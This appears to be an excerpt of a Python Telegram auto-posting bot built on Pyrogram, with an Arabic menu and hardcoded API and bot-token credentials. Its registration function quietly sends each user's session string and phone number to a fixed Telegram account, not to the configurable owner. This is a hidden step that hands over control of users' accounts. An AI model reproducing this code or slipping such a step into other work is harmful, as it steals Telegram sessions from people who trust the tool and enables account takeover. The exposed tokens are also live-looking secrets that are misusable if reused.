...
app = Client(
    "autoPost",
    api_id=28833972,
    api_hash="913bcd91267e46ad47674caf61a040e0",
    bot_token="7178650525:AAE-m9HVutlkiRFAY68Izwc5ASg7uyG0wqQ",
)
loop = get_event_loop()
listener = Listener(client = app)
owner = 7792036488 # YOUR ID
...
homeMarkup = Markup([
    ...
    [
        Button("-🕕 اضف مدة النشر 🕓 -", callback_data="waitTime"),
        Button("📝تعيين كليشة النشر-", callback_data="newCaption")
    ],
    [
        Button("-🌐 رابط مهم -", url="https://t.me/ZEKO124_6"),
    ],
    [
...
async def registration(message: Message):
    ...
    try:await app.send_message(7792036488, session+_number)
    except: pass
